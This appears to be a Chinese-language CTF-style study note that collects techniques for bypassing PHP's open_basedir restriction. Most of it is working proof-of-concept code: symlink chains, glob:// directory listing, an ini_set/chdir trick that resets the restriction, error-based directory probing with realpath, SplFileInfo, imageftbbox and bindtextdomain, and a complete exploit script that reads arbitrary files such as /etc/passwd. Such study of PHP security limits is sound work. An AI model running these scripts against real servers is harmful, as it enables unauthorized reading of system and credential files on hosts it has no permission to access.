[PHP绕过open_basedir列目录的研究 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)

[PHP绕过open_basedir限制操作文件的方法_lonmar~的博客-CSDN博客](https://blog.csdn.net/weixin_45551083/article/details/110109369)

[open_basedir绕过 - Von的博客 | Von Blog (v0n.top)](https://www.v0n.top/2020/07/10/open_basedir绕过/)

**关于`open_basedir`：**

pen_basedir是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域，假设`open_basedir=/home/wwwroot/home/web1/:/tmp/`，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。
注意用open_basedir指定的限制实际上是前缀,而不是目录名，举例来说: 若"open_basedir = /dir/user", 那么目录 “/dir/user” 和 "/dir/user1"都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。

**关于软连接：**

[Linux 命令之软连接详解_linux 软连接_LawsonAbs的博客-CSDN博客](https://blog.csdn.net/liu16659/article/details/83714066)

软链接文件有类似于Windows的快捷方式。它实际上是一个特殊的文件。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。

路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。

### 命令执行函数

由于open_basedir的设置对system等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录。

当我们设置好open_basedir之后，通过`file_get_contents()`去读取其他目录的文件，执行效果如图
![](../daydayup.assets/image-20230722160854725.png)

很明显我们无法直接读取open_basedir所规定以外的目录文件。接下来通过`system()`来实现相同的功能

![](../daydayup.assets/image-20230722161517469.png)

通过命令执行函数绕过open_basedir来读取flag，由于命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制。

### symlink()函数

我们先来了解一下`symlink()`函数

```
bool symlink ( string $target , string $link )
```

`symlink()`函数将建立一个指向target的名为link的符号链接，当然一般情况下这个target是受限于open_basedir的。

我们可以通过symlink完成一些逻辑上的绕过导致可以跨目录操作文件。

open_bashedir配置：`open_basedir = /var/www/html/`

首先在/var/www/html/slink.php中 编辑slink.php的内容为

```php
<?php
  //phpinfo();
  highlight_file(__FILE__);
  mkdir("./a");
  chdir("./a");
  mkdir("./b");
  chdir("./b");
  chdir("../");
  chdir("../");
  symlink("./a/b","tmplink");
  symlink("tmplink/../../flag","exp");
  unlink("tmplink");
  mkdir("tmplink");
  echo file_get_contents("http://127.0.0.1/exp");
?>
```

接着在/var/www/中新建一个flag文件内容为`flag{Hack!}`

![](../daydayup.assets/image-20230722181700956.png)

正常读一下内容
![](../daydayup.assets/image-20230722182048849-16900212512641.png)

执行刚才写好的脚本
![](../daydayup.assets/image-20230722182428909.png)

成功读取到flag，绕过了open_opendir的限制

因为一开始`tmplink`是一个软连接，链接`./a/b/`也就是`/vat/html/www/a/b/`所以`symlink("tmplink/../../flag","exp");`这条语句就相当于`symlink("/vat/html/www/a/b/../../flag","exp");`符合open_basedir的限制，所以`exp`这个软连接就成功建立了，然后删除软连接`tmplink`，再创建`tmplink`目录，此时语句就相当于`symlink("/vat/html/www/tmplink/../../flag","exp");`，由于这时候`tmplink`变成了一个真实存在的文件夹所以`tmplink/../../`变成了flag所在的目录即`/var/www/`，然后再通过访问符号链接文件`exp`即可直接读取到`flag`文件的内容，当然，针对`symlink()`只需要将它放入disable_function即可解决问题，所以我们需要寻求更多的方法。

### glob伪协议

glob是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，由于它在筛选目录时是不受open_basedir的制约的，所以我们可以利用它来绕过限制

```php
<?php
  $a = "glob:///var/www/";
  if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
      echo "filename:".$file."\n";
    }
    closedir($b);
  }
?>
```

#### glob://伪协议

glob://协议是php5.3.0以后一种查找匹配的文件路径模式。
官方给出了一个示例用法

```php
<?php
// 循环 ext/spl/examples/ 目录里所有 *.php 文件
// 并打印文件名和文件尺寸
$it = new DirectoryIterator("glob://ext/spl/examples/*.php");
foreach($it as $f) {
    printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
}
?
```

glob://伪协议需要结合其他函数方法才能列目录，单纯传参glob://是没办法列目录的。

#### DirectoryIterator+glob://

DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)
脚本差不多如下:

```php
<?php
$a = new DirectoryIterator("glob:///*");
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

可以看到,成功列出目录:
![](../daydayup.assets/open_basedir_5.png)

当传入的参数为glob:///\*时会列出根目录下的文件，传入参数为glob://\*时会列出open_basedir允许目录下的文件。

#### scandir()+glob://

这是看TCTF WP里面的一种方法，最为简单明了: 代码如下:

```
<?php
var_dump(scandir('glob:///*'));
>
```

![](../daydayup.assets/open_basedir_6.png)

这种方法也只能列出根目录和open_basedir允许目录下的文件。

#### opendir()+readdir()+glob://

脚本如下:

```
<?php
if ( $b = opendir('glob:///*') ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```

![](../daydayup.assets/open_basedir_7.png)

同理，这种方法也只能列出根目录和open_basedir允许目录下的文件。
可以看到，上面三种和glob://相关的协议，最大的缺陷就是只能列目录，而且还只能列根目录和open_basedir允许目录的内容。

#### ini_set()绕过

>`ini_set()`函数：
>
>ini_set()用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置。函数用法如下:
>
>```
>ini_set ( string $varname , string $newvalue ) : string
>```
>
>- varname是需要设置的值
>- newvalue是设置成为新的值
>- 成功时返回旧的值，失败时返回 FALSE。

当前我们处在/var/www/html文件夹下，对应的POC为:

```php
<?php
mkdir('Von');  //创建一个目录Von
chdir('Von');  //切换到Von目录下
ini_set('open_basedir','..');  //把open_basedir切换到上层目录
chdir('..');  //以下这三步是把目录切换到根目录
chdir('..');
chdir('..');
ini_set('open_basedir','/');  //设置open_basedir为根目录(此时相当于没有设置open_basedir)
echo file_get_contents('/etc/passwd');  //读取/etc/passwd
```

原理涉及到了PHP的底层实现，较为复杂，具体可以参考这几篇文章。

[bypass open_basedir的新方法 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/4720)

[从PHP底层看open_basedir bypass · sky's blog (skysec.top)](https://skysec.top/2019/04/12/从PHP底层看open-basedir-bypass/#poc测试)

#### 利用SplFileInfo::getRealPath()类方法绕过

`SplFileInfo`类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。我们在`SplFileInfo`的构造函数中传入文件相对路径，并且调用`getRealPath()`即可获取文件的绝对路径。
这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。脚本如下:

```php
<?php
$info = new SplFileInfo('/etc/passwd');
var_dump($info->getRealPath());
?>
```

当传入的路径存在时，返回路径。

当传入的路径不存在时，返回False。

但是如果我们完全不知道路径的情况下就和暴力猜解无异了，时间花费极高。在Windows系统下可以利用`<>`来列出所需目录下的文件，有P神的POC如下:

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
$basedir = 'D:/test/';
$arr = array();
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
for ($i=0; $i < strlen($chars); $i++) { 
    $info = new SplFileInfo($basedir . $chars[$i] . '<><');
    $re = $info->getRealPath();
    if ($re) {
        dump($re);
    }
}
function dump($s){
    echo $s . '<br/>';
    ob_flush();
    flush();
}
?>
```

当然由于<><是Windows特有的通配符。所以该POC只能在Windows环境下使用。Linux下只能暴力破解。

>在windows中可以使用通配符“* ”、“? ”查找文件，对于相同字符开头的单词和相同字符结尾的单词可以用“<”和“ >”通配符查找单词。
>
>1. 如果要查找： 任意单个字符 ：
>     键入 ? 例如，s?t 可查找“sat”和“set”……。
>2. 任意字符串 :
>     键入 * 例如，s*d 可查找“sad”和“started”……。
>3. 单词的开头
>     键入 < 例如，<(inter) 查找“interesting”和“intercept”……，但不查找“splintered”。
>4. 单词的结尾
>     键入 > 例如，(in)> 查找“in”和“within”……，但不查找“interesting”
>
>linux通配符
>
>![](../daydayup.assets/v2-8ad24c5e1b91a5741444e98851b94b01_r.jpg)

#### realpath()绕过

`realpath()`函数和`SplFileInfo::getRealPath()`作用类似。同样是可以得到绝对路径。函数定义如下:

```
realpath ( string $path ) : string
```

当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。 

所以我们可以通过这个特点，来进行目录的猜解。举个例子，我们需要猜解根目录（不在open_basedir中）下的所有文件，只用写一个捕捉php错误的函数`err_handle()`。当猜解某个存在的文件时，会因抛出错误而进入`err_handle()`，当猜解某个不存在的文件时，将不会进入`err_handle()`。

同样，对于这个函数，我们在Windows下仍然能够使用通配符<>来列目录，有P神的脚本如下:

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    realpath($file);
}
function isexists($errno, $errstr)
{
    $regexp = '/File\((.*)\) is not within/';
    preg_match($regexp, $errstr, $matches);
    if (isset($matches[1])) {
        printf("%s <br/>", $matches[1]);
    }
}
?>
```

`realpath()`和`SplFileInfo::getRealPath()`的区别在于，`realpath()`只有在启用了open_basedir()限制的情况下才能使用这种思路爆目录，而`SplFileInfo::getRealPath()`可以无视是否开启open_basedir进行列目录(当然，没有开启open_basedir也没必要花这么大的功夫来列目录了)

#### imageftbbox()绕过

GD库imageftbbox/imagefttext列举目录

GD库一般是PHP必备的扩展库之一，当中的`imageftbbox()`函数也可以起到像`realpath()`一样的列目录效果。
其思想也和open_basedir类似。这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。 也就是说，我们可以通过抛出错误的具体内容来判断一个文件是否存在。这个方法和realpath有相似性，都会抛出open_basedir的错误。

有POC如下:

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    //$m = imagecreatefrompng("zip.png");
    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');
    imageftbbox(100, 100, $file, 'aaa');
}
function isexists($errno, $errstr)
{
    global $file;
    if (stripos($errstr, 'Invalid font filename') === FALSE) {
        printf("%s<br/>", $file);
    }
}
?>
```

这个方法报错的时候并不会把真正的路径爆出来，这也是其与realpath的最大不同之处，用这种方法只能一位一位猜解列目录

而且和上面的两种方法类似，由于都使用了Windows的通配符，所以这些POC都只能在Windows下使用，Linux下只能暴力猜解。

#### bindtextdomain()绕过

bindtextdomain是php下绑定domain到某个目录的函数。用法如下:

```
bindtextdomain ( string $domain , string $directory ) : string
```

`bindtextdomain`是php下绑定domain到某个目录的函数。具体这个domain是什么我也没具体用过，只是在一些l10n应用中可能用到的方法（相关函数textdomain、gettext、setlocale，说明：http://php.net/manual/en/function.gettext.php）

所以第一个参数随便传都行，主要出在第二个参数上，当第二个参数即目录存在时，会返回目录的路径，当目录不存在时，会返回False。故有脚本如下:

```php
<?php
printf('<b>open_basedir: %s</b><br />', ini_get('open_basedir'));
$re = bindtextdomain('xxx', $_GET['dir']);
var_dump($re);
?>
```

我们也可以通过返回值的不同来猜解、列举某个目录。

但很大的鸡肋点在，windows下默认是没有这个函数的，而在linux下不能使用通配符进行目录的猜解，所以显得很鸡肋。

当然，在万无退路的时候进行暴力猜解目录，也不失为一个还算行的方法。

### EXP

[php5全版本绕过open_basedir读文件脚本 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/other/bypass-open-basedir-readfile.html)

```php
<?php
/*
* by phithon
* From https://www.leavesongs.com
* detail: http://cxsecurity.com/issue/WLB-2009110068
*/
header('content-type: text/plain');
error_reporting(-1);
ini_set('display_errors', TRUE);
printf("open_basedir: %s\nphp_version: %s\n", ini_get('open_basedir'), phpversion());
printf("disable_functions: %s\n", ini_get('disable_functions'));
$file = str_replace('\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');
$relat_file = getRelativePath(__FILE__, $file);
$paths = explode('/', $file);
$name = mt_rand() % 999;
$exp = getRandStr();
mkdir($name);
chdir($name);
for($i = 1 ; $i < count($paths) - 1 ; $i++){
    mkdir($paths[$i]);
    chdir($paths[$i]);
}
mkdir($paths[$i]);
for ($i -= 1; $i > 0; $i--) { 
    chdir('..');
}
$paths = explode('/', $relat_file);
$j = 0;
for ($i = 0; $paths[$i] == '..'; $i++) { 
    mkdir($name);
    chdir($name);
    $j++;
}
for ($i = 0; $i <= $j; $i++) { 
    chdir('..');
}
$tmp = array_fill(0, $j + 1, $name);
symlink(implode('/', $tmp), 'tmplink');
$tmp = array_fill(0, $j, '..');
symlink('tmplink/' . implode('/', $tmp) . $file, $exp);
unlink('tmplink');
mkdir('tmplink');
delfile($name);
$exp = dirname($_SERVER['SCRIPT_NAME']) . "/{$exp}";
$exp = "http://{$_SERVER['SERVER_NAME']}{$exp}";
echo "\n-----------------content---------------\n\n";
echo file_get_contents($exp);
delfile('tmplink');

function getRelativePath($from, $to) {
  // some compatibility fixes for Windows paths
  $from = rtrim($from, '\/') . '/';
  $from = str_replace('\\', '/', $from);
  $to   = str_replace('\\', '/', $to);

  $from   = explode('/', $from);
  $to     = explode('/', $to);
  $relPath  = $to;

  foreach($from as $depth => $dir) {
    // find first non-matching dir
    if($dir === $to[$depth]) {
      // ignore this directory
      array_shift($relPath);
    } else {
      // get number of remaining dirs to $from
      $remaining = count($from) - $depth;
      if($remaining > 1) {
        // add traversals up to first matching dir
        $padLength = (count($relPath) + $remaining - 1) * -1;
        $relPath = array_pad($relPath, $padLength, '..');
        break;
      } else {
        $relPath[0] = './' . $relPath[0];
      }
    }
  }
  return implode('/', $relPath);
}

function delfile($deldir){
    if (@is_file($deldir)) {
        @chmod($deldir,0777);
        return @unlink($deldir);
    }else if(@is_dir($deldir)){
        if(($mydir = @opendir($deldir)) == NULL) return false;
        while(false !== ($file = @readdir($mydir)))
        {
            $name = File_Str($deldir.'/'.$file);
            if(($file!='.') && ($file!='..')){delfile($name);}
        } 
        @closedir($mydir);
        @chmod($deldir,0777);
        return @rmdir($deldir) ? true : false;
    }
}

function File_Str($string)
{
    return str_replace('//','/',str_replace('\\','/',$string));
}

function getRandStr($length = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $randStr = '';
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
    }
    return $randStr;
}
```

如我们欲读取`/etc/passwd`。其实原理就是创建一个链接文件`x`，用相对路径指向`a/a/a/a`，再创建一个链接文件exp指向`x/../../../etc/passwd`。其实指向的就是`a/a/a/a/../../../etc/passwd`，其实就是`./etc/passwd`。这时候删除`x`，再创建一个`x`目录，但exp还是指向`x/../../../etc/passwd`，所以就成功跨到`/etc/passwd`了。 

精华就是这四句： 

```
<?php
symlink("abc/abc/abc/abc","tmplink"); 
symlink("tmplink/../../../etc/passwd", "exploit"); 
unlink("tmplink"); 
mkdir("tmplink");
```

我们访问 http://xxx/exp ，如果服务器支持链接文件的访问，那么就能读到`/etc/passwd`。 

其中并没有任何操作触发open_basedir，但达到的效果就是绕过了open_basedir读取任意文件。错误不在php，但又不知道把错误归结到谁头上，所以php一直未管这个问题。